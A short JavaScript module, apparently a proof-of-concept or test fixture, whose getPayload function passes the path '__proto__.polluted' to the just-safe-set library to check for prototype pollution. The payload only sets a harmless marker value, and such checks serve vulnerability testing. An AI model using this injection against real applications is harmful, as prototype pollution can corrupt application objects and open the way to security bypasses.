function getPayload() {
    const justSafeSet = require("just-safe-set");
    let obj = {};

    justSafeSet(obj, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };